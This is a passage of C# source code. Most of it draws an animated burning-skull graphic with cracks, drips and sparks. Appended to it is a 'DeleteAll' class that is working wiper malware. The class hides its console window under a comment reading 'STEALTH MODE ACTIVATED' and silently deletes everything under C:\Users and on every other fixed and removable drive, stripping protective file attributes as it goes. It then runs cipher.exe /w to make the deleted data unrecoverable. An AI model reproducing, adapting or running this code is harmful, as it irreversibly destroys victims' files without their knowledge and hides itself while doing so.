                LineJoin = LineJoin.Round
            })
            {
                g.DrawPath(ember, path);
            }

            using (Pen core = new(Color.FromArgb((int)(205 * flicker), 255, 225, 130), Math.Max(0.7f, crack.Width * 0.42f))
            {
                StartCap = LineCap.Round,
                EndCap = LineCap.Round,
                LineJoin = LineJoin.Round
            })
            {
                g.DrawPath(core, path);
            }
        }
    }

    private static void DrawBoneHighlights(Graphics g)
    {
        using Pen temple = new(Color.FromArgb(78, 188, 112, 78), 2.0f)
        {
            StartCap = LineCap.Round,
            EndCap = LineCap.Round
        };
        using GraphicsPath edges = new();
        edges.AddBezier(129f, 186f, 145f, 147f, 188f, 110f, 236f, 82f);
        edges.AddBezier(364f, 82f, 412f, 110f, 455f, 147f, 471f, 186f);
        edges.AddBezier(162f, 430f, 184f, 464f, 216f, 492f, 250f, 516f);
        edges.AddBezier(350f, 516f, 384f, 492f, 416f, 464f, 438f, 430f);
        g.DrawPath(temple, edges);

        using Pen jawLight = new(Color.FromArgb(48, 214, 130, 87), 1.5f);
        using GraphicsPath jaw = new();
        jaw.AddBezier(264f, 534f, 282f, 548f, 318f, 548f, 336f, 534f);
        g.DrawPath(jawLight, jaw);
    }

    private static void DrawOutline(Graphics g, GraphicsPath skull, float pulse)
    {
        using (Pen dark = new(Color.FromArgb(245, 5, 1, 0), 5.0f))
        {
            g.DrawPath(dark, skull);
        }

        using (LinearGradientBrush rimBrush = new(
                   new RectangleF(80f, 30f, 440f, 550f),
                   Color.FromArgb(105 + (int)(25 * pulse), 255, 134, 62),
                   Color.FromArgb(8, 96, 20, 7),
                   LinearGradientMode.Vertical))
        using (Pen rim = new(rimBrush, 2.7f))
        {
            g.DrawPath(rim, skull);
        }
    }

    private static void DrawDrips(Graphics g, float time)
    {
        foreach (DripSpec drip in Drips)
        {
            float cycle = (time * drip.Speed + drip.Phase) % 1f;
            float grow = Math.Min(1f, cycle / 0.68f);
            grow = 1f - (1f - grow) * (1f - grow);
            float len = Math.Max(3f, drip.Length * grow);
            float w = drip.Width;
            float wobble = (float)Math.Sin(time * 5.4f + drip.Phase * 7f) * w * 0.30f;
            float x = drip.X;

            using GraphicsPath strand = new();
            strand.StartFigure();
            strand.AddBezier(x - w * 0.5f, drip.Y,
                x - w * 0.45f + wobble, drip.Y + len * 0.30f,
                x - w * 0.24f, drip.Y + len * 0.78f,
                x - w * 0.10f, drip.Y + len);
            strand.AddBezier(x - w * 0.10f, drip.Y + len,
                x, drip.Y + len + w * 0.45f,
                x + w * 0.10f, drip.Y + len,
                x + w * 0.10f, drip.Y + len);
            strand.AddBezier(x + w * 0.10f, drip.Y + len,
                x + w * 0.26f, drip.Y + len * 0.78f,
                x + w * 0.45f + wobble, drip.Y + len * 0.30f,
                x + w * 0.5f, drip.Y);
            strand.CloseFigure();

            using (Pen glow = new(Color.FromArgb(34, 255, 62, 7), w + 7f)
            {
                StartCap = LineCap.Round,
                EndCap = LineCap.Round
            })
            {
                g.DrawPath(glow, strand);
            }

            using (LinearGradientBrush fill = new(
                       new PointF(x, drip.Y),
                       new PointF(x, drip.Y + len + w),
                       Color.FromArgb(245, 255, 236, 158),
                       Color.FromArgb(120, 255, 58, 5)))
            {
                g.FillPath(fill, strand);
            }

            using (Pen hot = new(Color.FromArgb(185, 255, 221, 117), Math.Max(1.1f, w * 0.20f))
            {
                StartCap = LineCap.Round,
                EndCap = LineCap.Round
            })
            {
                g.DrawLine(hot, x + wobble * 0.2f, drip.Y + 1f, x, drip.Y + len * 0.94f);
            }

            if (cycle > 0.76f)
            {
                float fall = (cycle - 0.76f) / 0.24f;
                float dy = drip.Y + len + fall * drip.Length * 0.82f;
                float dr = Math.Max(1.5f, w * (0.55f - fall * 0.30f));
                int alpha = (int)(210 * (1f - fall * 0.65f));

                using SolidBrush dropGlow = new(Color.FromArgb((int)(38 * (1f - fall * 0.5f)), 255, 70, 8));
                using SolidBrush drop = new(Color.FromArgb(Math.Max(0, alpha), 255, 156, 52));
                using SolidBrush dropCore = new(Color.FromArgb(Math.Max(0, alpha), 255, 242, 170));
                g.FillEllipse(dropGlow, x - dr * 4f, dy - dr * 4f, dr * 8f, dr * 8f);
                g.FillEllipse(drop, x - dr, dy - dr * 1.6f, dr * 2f, dr * 3.2f);
                g.FillEllipse(dropCore, x - dr * 0.45f, dy - dr * 0.9f, dr * 0.9f, dr * 1.8f);
            }
        }
    }

    private static void DrawSkullSparks(Graphics g, float time)
    {
        using SolidBrush halo = new(Color.FromArgb(30, 255, 84, 16));
        using SolidBrush mid = new(Color.FromArgb(115, 255, 137, 42));
        using SolidBrush core = new(Color.FromArgb(225, 255, 213, 128));

        foreach (SparkSpec spark in Sparks)
        {
            float rise = (time * 17f + spark.Phase * 40f) % 54f;
            float x = spark.X + (float)Math.Sin(time * 2.4f + spark.Phase) * 8f;
            float y = spark.Y - rise;
            float s = spark.Size;
            g.FillEllipse(halo, x - s * 4f, y - s * 4f, s * 8f, s * 8f);
            g.FillEllipse(mid, x - s * 1.8f, y - s * 1.8f, s * 3.6f, s * 3.6f);
            g.FillEllipse(core, x - s * 0.7f, y - s * 0.7f, s * 1.4f, s * 1.4f);
        }
    }

    private static CrackSpec[] CreateCracks()
    {
        List<CrackSpec> list = new()
        {
            new CrackSpec
            {
                Points = new[] { new PointF(300f, 47f), new PointF(318f, 88f), new PointF(305f, 122f), new PointF(326f, 155f), new PointF(312f, 188f) },
                Width = 2.4f, Phase = 0.4f, Intensity = 1.1f
            },
            new CrackSpec
            {
                Points = new[] { new PointF(318f, 92f), new PointF(344f, 108f), new PointF(352f, 136f) },
                Width = 1.3f, Phase = 2.3f, Intensity = 0.8f
            },
            new CrackSpec
            {
                Points = new[] { new PointF(257f, 71f), new PointF(242f, 108f), new PointF(215f, 133f), new PointF(229f, 169f), new PointF(207f, 197f) },
                Width = 2.0f, Phase = 3.2f, Intensity = 0.95f
            },
            new CrackSpec
            {
                Points = new[] { new PointF(467f, 182f), new PointF(449f, 213f), new PointF(458f, 242f), new PointF(442f, 272f) },
                Width = 1.6f, Phase = 1.1f, Intensity = 0.85f
            },
            new CrackSpec
            {
                Points = new[] { new PointF(133f, 192f), new PointF(151f, 221f), new PointF(143f, 249f), new PointF(158f, 276f) },
                Width = 1.4f, Phase = 5.0f, Intensity = 0.8f
            },
            new CrackSpec
            {
                Points = new[] { new PointF(151f, 329f), new PointF(173f, 354f), new PointF(161f, 382f), new PointF(174f, 405f) },
                Width = 1.5f, Phase = 0.8f, Intensity = 0.9f
            },
            new CrackSpec
            {
                Points = new[] { new PointF(448f, 333f), new PointF(427f, 358f), new PointF(438f, 386f), new PointF(421f, 411f) },
                Width = 1.5f, Phase = 4.2f, Intensity = 0.9f
            },
            new CrackSpec
            {
                Points = new[] { new PointF(236f, 516f), new PointF(248f, 536f), new PointF(240f, 553f) },
                Width = 1.3f, Phase = 2.8f, Intensity = 0.75f
            },
            new CrackSpec
            {
                Points = new[] { new PointF(364f, 516f), new PointF(352f, 536f), new PointF(360f, 553f) },
                Width = 1.3f, Phase = 3.9f, Intensity = 0.75f
            },
            new CrackSpec
            {
                Points = new[] { new PointF(300f, 520f), new PointF(315f, 538f), new PointF(307f, 555f) },
                Width = 1.0f, Phase = 1.6f, Intensity = 0.7f
            },
            new CrackSpec
            {
                Points = new[] { new PointF(282f, 318f), new PointF(294f, 337f), new PointF(286f, 355f) },
                Width = 1.0f, Phase = 0.9f, Intensity = 0.65f
            },
            new CrackSpec
            {
                Points = new[] { new PointF(405f, 145f), new PointF(425f, 160f), new PointF(432f, 183f), new PointF(454f, 196f) },
                Width = 1.1f, Phase = 2.2f, Intensity = 0.7f
            }
        };
        return list.ToArray();
    }

    private static CharSpec[] CreateCharring()
    {
        Random rng = new(80517);
        List<CharSpec> list = new();
        for (int i = 0; i < 72; i++)
        {
            float x = 110f + (float)rng.NextDouble() * 380f;
            float y = 54f + (float)rng.NextDouble() * 500f;
            float rx = 6f + (float)rng.NextDouble() * 37f;
            float ry = 5f + (float)rng.NextDouble() * 30f;
            int pick = rng.Next(0, 5);
            Color c = pick == 0
                ? Color.FromArgb(18 + rng.Next(0, 28), 4, 1, 0)
                : pick == 1
                    ? Color.FromArgb(12 + rng.Next(0, 22), 116, 36, 16)
                    : pick == 2
                        ? Color.FromArgb(10 + rng.Next(0, 18), 185, 80, 45)
                        : pick == 3
                            ? Color.FromArgb(10 + rng.Next(0, 20), 75, 46, 34)
                            : Color.FromArgb(12 + rng.Next(0, 22), 20, 9, 6);
            list.Add(new CharSpec { X = x, Y = y, RX = rx, RY = ry, Color = c });
        }
        return list.ToArray();
    }

    private static PointF[] CreateSootStreaks()
    {
        return new[]
        {
            new PointF(174f, 242f), new PointF(155f, 300f), new PointF(166f, 362f), new PointF(151f, 420f),
            new PointF(214f, 250f), new PointF(201f, 306f), new PointF(212f, 370f), new PointF(200f, 435f),
            new PointF(248f, 260f), new PointF(238f, 320f), new PointF(249f, 382f), new PointF(239f, 449f),
            new PointF(341f, 260f), new PointF(355f, 320f), new PointF(344f, 382f), new PointF(357f, 449f),
            new PointF(386f, 250f), new PointF(401f, 306f), new PointF(390f, 370f), new PointF(405f, 435f),
            new PointF(426f, 242f), new PointF(445f, 300f), new PointF(434f, 362f), new PointF(449f, 420f)
        };
    }

    private static DripSpec[] CreateDrips()
    {
        Random rng = new(6127);
        List<DripSpec> list = new();
        float[] xs = { 184f, 205f, 235f, 266f, 300f, 334f, 365f, 395f, 416f, 152f, 448f, 251f, 349f };
        float[] ys = { 302f, 332f, 365f, 516f, 540f, 516f, 365f, 332f, 302f, 352f, 352f, 508f, 508f };
        for (int i = 0; i < xs.Length; i++)
        {
            float length = i < 3 || i > 8
                ? 32f + (float)rng.NextDouble() * 78f
                : 58f + (float)rng.NextDouble() * 105f;
            float width = i < 3 || i > 8
                ? 4f + (float)rng.NextDouble() * 4f
                : 6f + (float)rng.NextDouble() * 7f;
            list.Add(new DripSpec
            {
                X = xs[i],
                Y = ys[i],
                Length = length,
                Width = width,
                Phase = (float)rng.NextDouble(),
                Speed = 0.24f + (float)rng.NextDouble() * 0.38f
            });
        }
        return list.ToArray();
    }

    private static SparkSpec[] CreateSparks()
    {
        Random rng = new(9127);
        List<SparkSpec> list = new();
        for (int i = 0; i < 22; i++)
        {
            float side = rng.Next(0, 2) == 0 ? -1f : 1f;
            list.Add(new SparkSpec
            {
                X = 300f + side * (125f + (float)rng.NextDouble() * 155f),
                Y = 280f + (float)rng.NextDouble() * 240f,
                Phase = (float)rng.NextDouble(),
                Size = 0.9f + (float)rng.NextDouble() * 2.1f
            });
        }
        return list.ToArray();
    }
}



class DeleteAll
{
    // --- Windows API imports to hide the console window ---
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

    public static void Run()
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("!!! WARNING !!!");
        Console.WriteLine("This will PERMANENTLY destroy:");

        // ==========================================
        // STEALTH MODE ACTIVATED
        // ==========================================
        
        // 1. Hide the console window
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // 2. Redirect Console output to Null so background output doesn't hang the app
        Console.SetOut(TextWriter.Null);

        // ---- Detect volumes ----
        var volumes = new List<(string VolumeRoot, string TargetPath)>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var drive in DriveInfo.GetDrives())
        {
            try
            {
                if (!drive.IsReady) continue;
                if (drive.DriveType != DriveType.Fixed && drive.DriveType != DriveType.Removable) continue;

                string root = drive.RootDirectory.FullName;
                if (string.IsNullOrEmpty(root)) continue;
                if (!seen.Add(root)) continue; // Skip duplicates

                string target = root.Equals(@"C:\", StringComparison.OrdinalIgnoreCase)
                    ? @"C:\Users"
                    : root;

                volumes.Add((root, target));
            }
            catch { /* Skip locked/empty drives silently */ }
        }

        if (volumes.Count == 0) return;

        // ---- Process each volume sequentially ----
        foreach (var v in volumes)
        {
            if (Directory.Exists(v.TargetPath))
            {
                DeleteContentsFast(v.TargetPath);
            }

            // Run cipher silently on the volume root
            RunCipher(v.VolumeRoot);
        }

        // After everything is done, kill the process instantly and silently.
        
    }

    static void DeleteContentsFast(string rootPath)
    {
        try
        {
            var di = new DirectoryInfo(rootPath);
            if ((di.Attributes & FileAttributes.ReadOnly) != 0)
                di.Attributes &= ~FileAttributes.ReadOnly;
        }
        catch { }

        var stack = new Stack<string>();
        var dirsToDelete = new List<string>();
        stack.Push(rootPath);

        while (stack.Count > 0)
        {
            string current = stack.Pop();
            dirsToDelete.Add(current);

            // Delete files in this directory
            string[] files;
            try { files = Directory.GetFiles(current); }
            catch { files = Array.Empty<string>(); }
            
            foreach (var f in files) TryDeleteFile(f);

            // Queue sub-directories
            string[] subs;
            try { subs = Directory.GetDirectories(current); }
            catch { subs = Array.Empty<string>(); }
            
            foreach (var d in subs) stack.Push(d);
        }

        // Delete directories deepest-first, skipping the root itself
        for (int i = dirsToDelete.Count - 1; i >= 0; i--)
        {
            string d = dirsToDelete[i];
            if (string.Equals(d, rootPath, StringComparison.OrdinalIgnoreCase)) continue;

            try
            {
                var di = new DirectoryInfo(d);
                var attrs = di.Attributes;
                if ((attrs & FileAttributes.ReadOnly) != 0) attrs &= ~FileAttributes.ReadOnly;
                if ((attrs & FileAttributes.Hidden) != 0) attrs &= ~FileAttributes.Hidden;
                if ((attrs & FileAttributes.System) != 0) attrs &= ~FileAttributes.System;
                if (attrs != di.Attributes) di.Attributes = attrs;

                // Handle Long Paths (> 260 chars) natively
                string longPath = d.StartsWith(@"\\?\") ? d : @"\\?\" + d;
                Directory.Delete(longPath, false);
            }
            catch { /* Ignore dirs that are locked or in use */ }
        }
    }

    static void TryDeleteFile(string path)
    {
        try
        {
            var fi = new FileInfo(path);
            if (!fi.Exists) return;

            var attrs = fi.Attributes;
            if ((attrs & FileAttributes.ReadOnly) != 0) attrs &= ~FileAttributes.ReadOnly;
            if ((attrs & FileAttributes.Hidden) != 0) attrs &= ~FileAttributes.Hidden;
            if ((attrs & FileAttributes.System) != 0) attrs &= ~FileAttributes.System;
            if (attrs != fi.Attributes) fi.Attributes = attrs;

            // Handle Long Paths (> 260 chars) natively
            string longPath = path.StartsWith(@"\\?\") ? path : @"\\?\" + path;
            File.Delete(longPath);
        }
        catch { /* Ignore files that are locked, in-use, or require permissions */ }
    }

    static void RunCipher(string volumeRoot)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "cipher.exe",
                Arguments = $"/w:{volumeRoot}",
                UseShellExecute = false,
                CreateNoWindow = true,            // Hides the cipher window completely
                RedirectStandardOutput = true,    // Prevents blocking
                RedirectStandardError = true      // Prevents blocking
            };

            using var p = Process.Start(psi);
            if (p != null)
            {
                // We must actively read the output, otherwise cipher.exe will freeze
                // when its internal buffer fills up during large wipes.
                p.OutputDataReceived += (s, e) => { };
                p.ErrorDataReceived += (s, e) => { };
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                p.WaitForExit(); // Wait until the drive is fully wiped
            }
        }
        catch { }
    }
}
